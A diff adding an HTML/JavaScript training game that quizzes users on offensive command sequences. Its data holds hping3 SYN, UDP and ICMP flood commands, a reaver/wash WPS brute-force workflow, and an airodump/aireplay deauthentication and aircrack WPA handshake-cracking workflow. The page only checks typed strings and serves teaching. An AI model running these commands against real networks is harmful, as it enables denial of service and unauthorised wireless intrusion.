@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cybersecurity Training Terminal</title>
+    <style>
+        :root {
+            --primary: #1e1e1e;
+            --secondary: #2d2d2d;
+            --text: #f0f0f0;
+            --accent: #4CAF50;
+            --error: #F44336;
+            --warning: #FFC107;
+            --info: #2196F3;
+            --prompt: #9CCC65;
+            --score: #9C27B0;
+        }
+        
+        body {
+            background-color: var(--primary);
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        #header {
+            background-color: var(--secondary);
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid var(--accent);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        #score-panel {
+            background-color: var(--secondary);
+            padding: 10px;
+            border: 1px solid var(--score);
+            border-radius: 5px;
+        }
+        
+        #terminal-container {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        
+        #terminal {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        #output {
+            flex: 1;
+            overflow-y: auto;
+            margin-bottom: 10px;
+        }
+        
+        #input-line {
+            display: flex;
+            align-items: center;
+            margin-top: auto;
+        }
+        
+        #prompt {
+            color: var(--prompt);
+            margin-right: 10px;
+            white-space: nowrap;
+        }
+        
+        #command-input {
+            background: transparent;
+            border: none;
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            flex: 1;
+            font-size: 16px;
+            outline: none;
+            caret-color: var(--accent);
+        }
+        
+        .command {
+            color: var(--accent);
+            margin-bottom: 5px;
+        }
+        
+        .output {
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+        
+        .success { color: var(--accent); }
+        .error { color: var(--error); }
+        .warning { color: var(--warning); }
+        .info { color: var(--info); }
+        .hint { color: var(--warning); font-style: italic; }
+        .score { color: var(--score); font-weight: bold; }
+        
+        .module-title {
+            color: var(--accent);
+            font-weight: bold;
+            margin: 15px 0 5px 0;
+        }
+        
+        .step-indicator {
+            color: var(--info);
+            margin-bottom: 10px;
+        }
+        
+        #modules-btn {
+            background-color: var(--secondary);
+            color: var(--text);
+            border: 1px solid var(--accent);
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        
+        #modules-panel {
+            display: none;
+            background-color: var(--secondary);
+            padding: 15px;
+            border: 1px solid var(--accent);
+            position: absolute;
+            right: 20px;
+            top: 60px;
+            z-index: 100;
+        }
+        
+        .module-btn {
+            display: block;
+            background-color: var(--primary);
+            color: var(--text);
+            border: none;
+            padding: 8px 15px;
+            margin: 5px 0;
+            cursor: pointer;
+            width: 100%;
+            text-align: left;
+        }
+        
+        .module-btn:hover {
+            background-color: var(--accent);
+            color: var(--primary);
+        }
+        
+        #reset-btn {
+            background-color: var(--secondary);
+            color: var(--text);
+            border: 1px solid var(--error);
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        
+        #hint-btn {
+            background-color: var(--secondary);
+            color: var(--text);
+            border: 1px solid var(--warning);
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        
+        #progress-btn {
+            background-color: var(--secondary);
+            color: var(--text);
+            border: 1px solid var(--info);
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        
+        .button-container {
+            display: flex;
+            margin-bottom: 10px;
+        }
+        
+        .hidden-command {
+            color: var(--secondary);
+            background-color: var(--secondary);
+            user-select: none;
+        }
+        
+        .hidden-command::selection {
+            background: transparent;
+        }
+    </style>
+</head>
+<body>
+    <div id="header">
+        <h1>Cybersecurity Training Terminal</h1>
+        <div id="score-panel">
+            <span class="score">Score: <span id="score-value">0</span></span>
+            <span class="score"> | </span>
+            <span class="score">Completed: <span id="completed-value">0</span>/3</span>
+        </div>
+    </div>
+    
+    <div id="terminal-container">
+        <div id="terminal">
+            <div id="output">
+                <div class="output info">Welcome to Cybersecurity Training Terminal!</div>
+                <div class="output info">Type commands or click the buttons below to navigate.</div>
+                <div class="output info">Start by selecting a module from the Modules button.</div>
+            </div>
+            
+            <div class="button-container">
+                <button id="modules-btn">Modules</button>
+                <button id="reset-btn">Reset</button>
+                <button id="hint-btn">Hint</button>
+                <button id="progress-btn">Progress</button>
+            </div>
+            
+            <div id="input-line">
+                <span id="prompt">cyberlab&gt;</span>
+                <input type="text" id="command-input" autofocus>
+            </div>
+        </div>
+    </div>
+    
+    <div id="modules-panel">
+        <h3>Training Modules</h3>
+        <button class="module-btn" data-module="DOS_DDOS_Attacks">DOS/DDOS Attacks</button>
+        <button class="module-btn" data-module="wps_attack">WPS Attack</button>
+        <button class="module-btn" data-module="wpa/wpa2">WPA/WPA2 Cracking</button>
+    </div>
+
+    <script>
+        // Command data
+        const commands = {
+            "DOS_DDOS_Attacks": [
+                {
+                    "command": "sudo hping3 -S -p 80 --flood --rand-source <target_IP>",
+                    "hint": "Use this command to launch a SYN Flood attack.",
+                    "success": "Great! You executed the SYN Flood attack."
+                },
+                {
+                    "command": "sudo hping3 --udp -p 53 --flood --rand-source <target_IP>",
+                    "hint": "This command is used to flood a target with UDP packets.",
+                    "success": "Well done! You executed the UDP Flood attack."
+                },
+                {
+                    "command": "sudo hping3 --icmp --flood <target_IP>",
+                    "hint": "This command sends a massive number of ICMP Echo requests (ping flood).",
+                    "success": "Awesome! The ICMP Flood attack was executed."
+                },
+                {
+                    "command": "sudo hping3 -p 80 --flood <target_IP>",
+                    "hint": "This command is a basic HTTP flood attack targeting port 80.",
+                    "success": "Good job! The HTTP Flood attack is running."
+                }
+            ],
+            "wps_attack": [
+                {
+                    "command": "ifconfig wlan0 down",
+                    "hint": "First, disable the wireless adapter to configure it.",
+                    "success": "Adapter disabled! Now, let's prevent conflicts by stopping network processes."
+                },
+                {
+                    "command": "airmon-ng check kill",
+                    "hint": "Now, stop all interfering network processes.",
+                    "success": "Processes stopped! Let's put the adapter into monitor mode."
+                },
+                {
+                    "command": "airmon-ng start wlan0",
+                    "hint": "Start the adapter in monitor mode to capture packets.",
+                    "success": "Monitor mode enabled! Now, let's find WPS-enabled networks."
+                },
+                {
+                    "command": "wash --interface wlan0mon",
+                    "hint": "Scan for networks that have WPS enabled.",
+                    "success": "Networks listed! Now, we will start attacking a target."
+                },
+                {
+                    "command": "reaver --bssid 00:10:18:90:2D:EE --channel 1 --interface wlan0mon -vvv --no-associate",
+                    "hint": "Start the WPS brute-force attack on a target network. (Replace BSSID if needed.)",
+                    "success": "Reaver started! Now, we need to maintain association with the network."
+                },
+                {
+                    "command": "aireplay-ng --fakeauth 30 -a 00:10:18:90:2D:EE -h 48:50:60:5D:45:25 wlan0mon",
+                    "hint": "Associate with the target network every 30 seconds to keep the connection alive.",
+                    "success": "Fake authentication successful! WPS attack in progress."
+                }
+            ],
+            "wpa/wpa2": [
+                {
+                    "command": "ifconfig wlan0 down",
+                    "hint": "Disable the wireless adapter before setting up monitor mode.",
+                    "success": "Adapter disabled! Next, stop interfering network processes."
+                },
+                {
+                    "command": "airmon-ng check kill",
+                    "hint": "Stop all interfering network services.",
+                    "success": "Services stopped! Now, enable monitor mode."
+                },
+                {
+                    "command": "airmon-ng start wlan0",
+                    "hint": "Enable monitor mode on your wireless adapter.",
+                    "success": "Monitor mode enabled! Let's scan for nearby networks."
+                },
+                {
+                    "command": "airodump-ng wlan0mon",
+                    "hint": "Scan for available wireless networks.",
+                    "success": "Networks listed! Identify the target network."
+                },
+                {
+                    "command": "airodump-ng --bssid 00:10:18:90:2D:EE --channel 1 --write wpa_handshake wlan0mon",
+                    "hint": "Focus on the target network and start capturing packets.",
+                    "success": "Packet capture started! Now, force a deauthentication attack."
+                },
+                {
+                    "command": "aireplay-ng --deauth 4 -a 00:10:18:90:2D:EE -c 00:10:18:90:2D:EE wlan0mon",
+                    "hint": "Send deauthentication packets to force a device to reconnect.",
+                    "success": "Deauthentication attack sent! Now, wait for the handshake capture."
+                },
+                {
+                    "command": "quit airodump-ng",
+                    "hint": "Stop airodump-ng once the handshake is captured.",
+                    "success": "Airodump-ng stopped! Now, let's crack the handshake."
+                },
+                {
+                    "command": "crunch 6 8 123abc$ -o wordlist.txt -t a@@@@b",
+                    "hint": "Generate a wordlist with specific patterns.",
+                    "success": "Wordlist created! Now, use it to crack the handshake."
+                },
+                {
+                    "command": "aircrack-ng wpa_handshake-01.cap -w wordlist.txt",
+                    "hint": "Use the wordlist to attempt cracking the WPA handshake.",
+                    "success": "Cracking started! This process may take some time."
+                }
+            ]
+        };
+
+        // DOM elements
+        const output = document.getElementById('output');
+        const commandInput = document.getElementById('command-input');
+        const modulesBtn = document.getElementById('modules-btn');
+        const modulesPanel = document.getElementById('modules-panel');
+        const resetBtn = document.getElementById('reset-btn');
+        const hintBtn = document.getElementById('hint-btn');
+        const progressBtn = document.getElementById('progress-btn');
+        const scoreValue = document.getElementById('score-value');
+        const completedValue = document.getElementById('completed-value');
+        
+        // Terminal state
+        let currentModule = null;
+        let currentStep = 0;
+        let score = 0;
+        let completedModules = 0;
+        let moduleCompletedStatus = {
+            "DOS_DDOS_Attacks": false,
+            "wps_attack": false,
+            "wpa/wpa2": false
+        };
+        
+        // Add output to terminal
+        function addOutput(text, className = '') {
+            const outputLine = document.createElement('div');
+            outputLine.className = `output ${className}`;
+            outputLine.textContent = text;
+            output.appendChild(outputLine);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        // Add command to terminal
+        function addCommand(cmd) {
+            const cmdLine = document.createElement('div');
+            cmdLine.className = 'command';
+            cmdLine.textContent = `cyberlab> ${cmd}`;
+            output.appendChild(cmdLine);
+        }
+        
+        // Update score display
+        function updateScore() {
+            scoreValue.textContent = score;
+            completedValue.textContent = completedModules;
+        }
+        
+        // Add points to score
+        function addPoints(points) {
+            score += points;
+            updateScore();
+        }
+        
+        // Start a module
+        function startModule(module) {
+            currentModule = module;
+            currentStep = 0;
+            output.innerHTML = '';
+            addOutput(`Starting ${module} training module...`, 'info');
+            addOutput(`Step ${currentStep + 1} of ${commands[module].length}`, 'step-indicator');
+            addOutput(`Objective: ${commands[module][currentStep].hint}`, 'hint');
+            addOutput(`Enter the appropriate command:`, 'info');
+            addOutput(`<hidden command>`, 'hidden-command');
+        }
+        
+        // Process command input
+        function processCommand(cmd) {
+            if (!currentModule) {
+                addOutput('Please select a module first using the Modules button', 'error');
+                return;
+            }
+            
+            addCommand(cmd);
+            
+            const expectedCmd = commands[currentModule][currentStep].command;
+            
+            if (cmd === expectedCmd) {
+                addOutput(commands[currentModule][currentStep].success, 'success');
+                addPoints(10); // Award 10 points for each correct command
+                
+                currentStep++;
+                
+                if (currentStep >= commands[currentModule].length) {
+                    addOutput(`Congratulations! You've completed the ${currentModule} module!`, 'success');
+                    addPoints(50); // Bonus 50 points for completing a module
+                    
+                    if (!moduleCompletedStatus[currentModule]) {
+                        moduleCompletedStatus[currentModule] = true;
+                        completedModules++;
+                        updateScore();
+                    }
+                    
+                    currentModule = null;
+                    currentStep = 0;
+                } else {
+                    addOutput(`Step ${currentStep + 1} of ${commands[currentModule].length}`, 'step-indicator');
+                    addOutput(`Objective: ${commands[currentModule][currentStep].hint}`, 'hint');
+                    addOutput(`Enter the appropriate command:`, 'info');
+                    addOutput(`<hidden command>`, 'hidden-command');
+                }
+            } else {
+                addOutput('Incorrect command. Try again.', 'error');
+                addPoints(-2); // Deduct 2 points for incorrect attempts
+            }
+        }
+        
+        // Show hint
+        function showHint() {
+            if (!currentModule) {
+                addOutput('No active module. Select a module first.', 'error');
+                return;
+            }
+            addOutput(`Hint: ${commands[currentModule][currentStep].hint}`, 'hint');
+            addPoints(-5); // Deduct 5 points for using a hint
+        }
+        
+        // Show progress
+        function showProgress() {
+            if (!currentModule) {
+                addOutput('No active module. Select a module first.', 'error');
+                return;
+            }
+            addOutput(`Current module: ${currentModule}`, 'info');
+            addOutput(`Current step: ${currentStep + 1} of ${commands[currentModule].length}`, 'info');
+            addOutput(`Score: ${score}`, 'score');
+        }
+        
+        // Reset current module
+        function resetModule() {
+            if (!currentModule) {
+                addOutput('No active module to reset.', 'error');
+                return;
+            }
+            addOutput(`Resetting ${currentModule} module...`, 'warning');
+            startModule(currentModule);
+            addPoints(-10); // Deduct 10 points for resetting
+        }
+        
+        // Event listeners
+        commandInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const cmd = commandInput.value.trim();
+                if (cmd) {
+                    processCommand(cmd);
+                    commandInput.value = '';
+                }
+            }
+        });
+        
+        modulesBtn.addEventListener('click', function() {
+            modulesPanel.style.display = modulesPanel.style.display === 'block' ? 'none' : 'block';
+        });
+        
+        document.querySelectorAll('.module-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                modulesPanel.style.display = 'none';
+                startModule(this.dataset.module);
+            });
+        });
+        
+        resetBtn.addEventListener('click', resetModule);
+        hintBtn.addEventListener('click', showHint);
+        progressBtn.addEventListener('click', showProgress);
+        
+        // Close modules panel when clicking outside
+        document.addEventListener('click', function(e) {
+            if (!modulesPanel.contains(e.target) && e.target !== modulesBtn) {
+                modulesPanel.style.display = 'none';
+            }
+        });
+        
+        // Initialize score display
+        updateScore();
+    </script>
+</body>
+</html>
